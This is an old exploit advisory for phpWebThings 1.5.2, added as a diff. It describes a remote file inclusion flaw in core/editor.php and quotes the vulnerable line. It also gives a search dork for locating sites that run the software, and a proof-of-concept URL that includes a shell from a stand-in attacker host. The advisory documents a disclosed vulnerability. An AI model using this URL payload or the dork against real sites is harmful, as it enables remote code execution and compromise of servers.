@@ -1,0 +1,26 @@
++-------------------------------------------------------------------------------------------
++ phpWebThings 1.5.2 (editor.php) Remote File Include Vulnerability
++-------------------------------------------------------------------------------------------
++ Affected Software .: phpWebThings 1.5.2
++ Vendor ............: http://www.phpwebthings.nl/
++ Download ..........: http://prdownloads.sourceforge.net/phpwebthings/phpwebthings_1_5_2.zip?download
++ Description .......: "phpWebThings is a Powerful, professional application framework"
++ Dork ..............: "This website was created with phpWebThings"
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ phpWebThings 1.5.2 core/editor.php does not initialize the $editor_insert_bottom variable
++ before using it to include files, assuming register_globals = on, we can initialize the
++ variable in a query string and include a remote file of our choice.
++
++ Vulnerable Code: 
++ core/editor.php, line(s) 289:
++ -> 289: if ($editor_insert_bottom<>"") include($editor_insert_bottom);
++
++ Proof Of Concept:
++ http://[target]/[path]/core/editor.php?editor_insert_bottom=http://evilsite.com/shell.php
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-11-18]
